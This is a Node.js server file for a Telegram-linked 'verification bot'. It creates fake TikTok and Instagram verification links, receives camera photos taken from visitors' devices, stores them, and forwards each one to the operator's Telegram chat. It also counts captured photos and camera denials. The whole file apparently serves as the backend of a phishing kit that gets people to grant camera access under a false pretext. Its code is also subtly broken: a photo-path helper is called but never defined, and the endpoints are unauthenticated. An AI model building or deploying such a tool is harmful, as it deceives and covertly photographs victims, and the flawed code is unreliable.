// ============================================================
// server.js — CRASH-PROOF VERSION
// ============================================================

require('dotenv').config();
const express = require('express');
const { Telegraf } = require('telegraf');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
const fs = require('fs');

// ============================================================
// CONFIG
// ============================================================

const app = express();
const PORT = process.env.PORT || 3000;
const BASE_URL = process.env.BASE_URL || `http://localhost:${PORT}`;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const TOKEN = process.env.TELEGRAM_BOT_TOKEN;

if (!TOKEN) {
    console.error('❌ TELEGRAM_BOT_TOKEN is required in .env');
    process.exit(1);
}

console.log('📋 Configuration:');
console.log(`   PORT: ${PORT}`);
console.log(`   BASE_URL: ${BASE_URL}`);
console.log(`   ADMIN_CHAT_ID: ${ADMIN_CHAT_ID || 'NOT SET'}`);
console.log(`   TOKEN: ${TOKEN ? TOKEN.substring(0, 10) + '...' : 'MISSING'}`);

// ============================================================
// DATA STORAGE
// ============================================================

const DATA_DIR = path.join(__dirname, 'data');
const PHOTOS_DIR = path.join(DATA_DIR, 'photos');

try {
    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
    if (!fs.existsSync(PHOTOS_DIR)) fs.mkdirSync(PHOTOS_DIR, { recursive: true });
} catch (e) {
    console.error('Failed to create data directories:', e.message);
}

const DB_PATH = path.join(DATA_DIR, 'database.json');

function getDatabase() {
    try {
        if (fs.existsSync(DB_PATH)) {
            const raw = fs.readFileSync(DB_PATH, 'utf-8');
            return JSON.parse(raw);
        }
    } catch (e) {
        console.error('DB read error:', e.message);
    }
    return { links: [], photos: [] };
}

function saveDatabase(db) {
    try {
        fs.writeFileSync(DB_PATH, JSON.stringify(db, null, 2));
    } catch (e) {
        console.error('DB write error:', e.message);
    }
}

function savePhotoBase64(filename, base64Data) {
    try {
        const buffer = Buffer.from(base64Data.replace(/^data:image\/\w+;base64,/, ''), 'base64');
        const filePath = path.join(PHOTOS_DIR, filename);
        fs.writeFileSync(filePath, buffer);
        return filename;
    } catch (e) {
        console.error('Photo save error:', e.message);
        return null;
    }
}

// ============================================================
// TELEGRAM BOT
// ============================================================

let bot;
try {
    bot = new Telegraf(TOKEN);
} catch (e) {
    console.error('Failed to create bot:', e.message);
    process.exit(1);
}

// Wrap all bot handlers in try-catch
bot.command('start', async (ctx) => {
    try {
        const chatId = ctx.chat.id;
        console.log(`📨 /start received from chat ID: ${chatId}`);
        
        const isAdmin = ADMIN_CHAT_ID && String(chatId) === String(ADMIN_CHAT_ID);
        
        if (!ADMIN_CHAT_ID) {
            await ctx.reply(
                `✅ Bot is running!\n\nYour Chat ID is: \`${chatId}\`\n\n` +
                `Add this to your \`.env\` file as:\n\`ADMIN_CHAT_ID=${chatId}\`\n\n` +
                `Then restart the bot.`,
                { parse_mode: 'Markdown' }
            );
            return;
        }

        if (!isAdmin) {
            await ctx.reply('❌ You are not authorized to use this bot.');
            return;
        }

        const adminUrl = `${BASE_URL}/index.html`;
        const dashboardUrl = `${BASE_URL}/dashboard.html`;

        await ctx.replyWithHTML(
            `🤖 <b>Verification Bot Active</b>\n\n` +
            `🔗 <b>Admin Panel:</b> <a href="${adminUrl}">${adminUrl}</a>\n` +
            `📸 <b>Dashboard:</b> <a href="${dashboardUrl}">${dashboardUrl}</a>\n\n` +
            `Use the buttons below:`,
            {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '🔗 Open Admin Panel', url: adminUrl }],
                        [{ text: '📸 Open Dashboard', url: dashboardUrl }],
                        [{ text: '📊 Stats', callback_data: 'stats' }]
                    ]
                }
            }
        );
    } catch (e) {
        console.error('/start error:', e.message);
    }
});

bot.command('stats', async (ctx) => {
    try {
        const chatId = ctx.chat.id;
        if (ADMIN_CHAT_ID && String(chatId) !== String(ADMIN_CHAT_ID)) return;
        await sendStats(ctx);
    } catch (e) {
        console.error('/stats error:', e.message);
    }
});

bot.action('stats', async (ctx) => {
    try {
        await ctx.answerCbQuery();
        if (ADMIN_CHAT_ID && String(ctx.chat.id) !== String(ADMIN_CHAT_ID)) return;
        await sendStats(ctx);
    } catch (e) {
        console.error('stats action error:', e.message);
    }
});

async function sendStats(ctx) {
    try {
        const db = getDatabase();
        const totalLinks = db.links.length;
        const totalPhotos = db.photos.filter(p => p.photoFile).length;
        const totalDenied = db.photos.filter(p => !p.photoFile).length;

        await ctx.reply(
            `📊 *Bot Statistics*\n\n` +
            `📎 Links Generated: ${totalLinks}\n` +
            `📸 Photos Captured: ${totalPhotos}\n` +
            `🚫 Camera Denied: ${totalDenied}`,
            { parse_mode: 'Markdown' }
        );
    } catch (e) {
        console.error('sendStats error:', e.message);
    }
}

// Handle ALL other messages without crashing
bot.on('message', async (ctx) => {
    try {
        // Just ignore non-command messages silently
    } catch (e) {
        // Do nothing
    }
});

// Handle ALL errors in bot
bot.catch((err) => {
    console.error('Bot error:', err.message);
});

// ============================================================
// EXPRESS SERVER
// ============================================================

app.use(express.json({ limit: '50mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// Global error handler for Express — prevents crashes
app.use((err, req, res, next) => {
    console.error('Express error:', err.message);
    res.status(500).json({ error: 'Internal server error' });
});

// Health check
app.get('/health', (req, res) => {
    res.json({ status: 'ok', time: new Date().toISOString() });
});

// API: Generate link (FIXED — no crash)
app.post('/api/generate-link', (req, res) => {
    try {
        const { platform, name } = req.body;
        
        console.log('📝 Generate link request:', { platform, name });
        
        if (!platform || !['tiktok', 'instagram'].includes(platform)) {
            return res.status(400).json({ error: 'Invalid platform. Use "tiktok" or "instagram".' });
        }

        const token = uuidv4().replace(/-/g, '').substring(0, 16);
        const timestamp = new Date().toISOString();
        const linkName = name || `${platform}_${Date.now()}`;

        const db = getDatabase();
        db.links.push({ token, platform, name: linkName, createdAt: timestamp });
        saveDatabase(db);

        const verifyUrl = `${BASE_URL}/verify.html?token=${token}`;
        
        console.log('✅ Link generated:', verifyUrl);
        
        // Try to notify admin — but DON'T CRASH if it fails
        if (ADMIN_CHAT_ID && bot) {
            bot.telegram.sendMessage(
                ADMIN_CHAT_ID,
                `🔗 *New Link Generated*\n\n` +
                `Platform: ${platform === 'tiktok' ? '♫ TikTok' : '📷 Instagram'}\n` +
                `Name: ${linkName}\n` +
                `Link: \`${verifyUrl}\``,
                { parse_mode: 'Markdown' }
            ).catch(err => {
                console.log('⚠️ Telegram notify failed (non-fatal):', err.message);
            });
        }

        res.json({ token, platform, name: linkName, verifyUrl, createdAt: timestamp });
        
    } catch (e) {
        console.error('❌ Generate link error:', e.message);
        console.error(e.stack);
        res.status(500).json({ error: 'Failed to generate link: ' + e.message });
    }
});

// API: Receive capture
app.post('/api/capture', async (req, res) => {
    try {
        const { token, platform, name, imageData, error } = req.body;
        
        if (!token) {
            return res.status(400).json({ error: 'Token is required' });
        }

        const timestamp = new Date().toISOString();
        const db = getDatabase();
        let savedFilename = null;

        if (imageData) {
            const filename = `${token}_${Date.now()}.jpg`;
            savedFilename = savePhotoBase64(filename, imageData);
            db.photos.push({ token, platform, name: name || 'unknown', capturedAt: timestamp, photoFile: savedFilename });
        } else {
            db.photos.push({ token, platform, name: name || 'unknown', capturedAt: timestamp, error: error || 'No image data' });
        }
        
        saveDatabase(db);
        console.log(`📸 Capture saved: ${savedFilename || 'no photo'}`);

        // Send to Telegram
        if (ADMIN_CHAT_ID && imageData && bot) {
            try {
                const buffer = Buffer.from(imageData.replace(/^data:image\/\w+;base64,/, ''), 'base64');
                const platformEmoji = platform === 'tiktok' ? '♫' : '📷';
                
                await bot.telegram.sendPhoto(
                    ADMIN_CHAT_ID,
                    { source: buffer, filename: `capture_${token}.jpg` },
                    {
                        caption: `📸 *New Photo Captured!*\n\n${platformEmoji} Platform: ${platform === 'tiktok' ? 'TikTok' : 'Instagram'}\n👤 Name: ${name || 'unknown'}\n🕐 Time: ${timestamp}`,
                        parse_mode: 'Markdown'
                    }
                );
                console.log('✅ Photo sent to Telegram');
            } catch (e) {
                console.error('Failed to send photo to Telegram:', e.message);
            }
        } else if (ADMIN_CHAT_ID && error && bot) {
            bot.telegram.sendMessage(
                ADMIN_CHAT_ID, 
                `🚫 *Camera Denied*\n\n👤 ${name || 'unknown'}\n⚠️ ${error}`, 
                { parse_mode: 'Markdown' }
            ).catch(e => console.log('Telegram error:', e.message));
        }

        res.json({ success: true, timestamp });
        
    } catch (e) {
        console.error('❌ Capture error:', e.message);
        res.status(500).json({ error: 'Capture failed: ' + e.message });
    }
});

// API: Get photos
app.get('/api/photos', (req, res) => {
    try {
        const db = getDatabase();
        const sorted = [...db.photos].sort((a, b) => new Date(b.capturedAt) - new Date(a.capturedAt));
        const photos = sorted.map(p => ({
            token: p.token,
            platform: p.platform,
            name: p.name,
            capturedAt: p.capturedAt,
            error: p.error || null,
            imageUrl: p.photoFile ? `${BASE_URL}/api/photo/${p.photoFile}` : null
        }));
        res.json(photos);
    } catch (e) {
        console.error('Photos fetch error:', e.message);
        res.status(500).json({ error: e.message });
    }
});

// Serve photo files
app.get('/api/photo/:filename', (req, res) => {
    try {
        const filePath = getPhotoPath(req.params.filename);
        if (fs.existsSync(filePath)) {
            res.sendFile(filePath);
        } else {
            res.status(404).json({ error: 'Photo not found' });
        }
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// Delete all
app.delete('/api/photos', (req, res) => {
    try {
        const db = getDatabase();
        db.photos = [];
        saveDatabase(db);
        if (fs.existsSync(PHOTOS_DIR)) {
            fs.readdirSync(PHOTOS_DIR).forEach(f => {
                try { fs.unlinkSync(path.join(PHOTOS_DIR, f)); } catch {}
            });
        }
        res.json({ success: true });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// Stats
app.get('/api/stats', (req, res) => {
    try {
        const db = getDatabase();
        res.json({
            totalLinks: db.links.length,
            totalPhotos: db.photos.filter(p => p.photoFile).length,
            totalDenied: db.photos.filter(p => !p.photoFile).length
        });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// ============================================================
// START
// ============================================================

// Start the bot with POLLING
console.log('\n🔄 Starting bot in POLLING mode...');
bot.launch()
    .then(() => console.log('✅ Telegram bot is running (polling mode)'))
    .catch(err => {
        console.error('❌ Failed to start bot:', err.message);
        console.log('⚠️  Make sure TELEGRAM_BOT_TOKEN is correct in .env');
    });

// Start Express
const server = app.listen(PORT, '0.0.0.0', () => {
    const address = server.address();
    console.log(`
╔══════════════════════════════════════════╗
║     🤖 Telegram Verify Bot — Running     ║
╠══════════════════════════════════════════╣
║  Port:        ${String(address.port).padEnd(27)}║
║  Admin Panel: ${(BASE_URL + '/index.html').padEnd(27)}║
║  Dashboard:   ${(BASE_URL + '/dashboard.html').padEnd(27)}║
║  Verify Page: ${(BASE_URL + '/verify.html').padEnd(27)}║
║  Mode:        POLLING (no webhook)       ║
╚══════════════════════════════════════════╝
    `);
    
    // Check if admin chat is configured
    if (!ADMIN_CHAT_ID) {
        console.log('\n⚠️  ADMIN_CHAT_ID not set in .env');
        console.log('   Send /start to your bot to get your Chat ID.');
        console.log('   Then add it to .env and restart.');
    } else {
        // Try to send startup message
        if (bot) {
            bot.telegram.sendMessage(
                ADMIN_CHAT_ID,
                `🤖 *Bot Started!*\n\n🔗 Admin: ${BASE_URL}/index.html\n📸 Dashboard: ${BASE_URL}/dashboard.html`,
                { parse_mode: 'Markdown' }
            ).then(() => {
                console.log('✅ Startup message sent to admin');
            }).catch(err => {
                console.log('⚠️ Could not send startup message. Check ADMIN_CHAT_ID.');
                console.log('   Error:', err.message);
            });
        }
    }
});

// Handle process termination gracefully
process.once('SIGINT', () => {
    console.log('\n👋 Shutting down...');
    if (bot) bot.stop('SIGINT');
    server.close();
});

process.once('SIGTERM', () => {
    console.log('\n👋 Shutting down...');
    if (bot) bot.stop('SIGTERM');
    server.close();
});

// Catch any unhandled errors and prevent crash
process.on('uncaughtException', (err) => {
    console.error('💥 Uncaught exception (non-fatal):', err.message);
    console.error(err.stack);
});

process.on('unhandledRejection', (err) => {
    console.error('💥 Unhandled rejection (non-fatal):', err.message);
});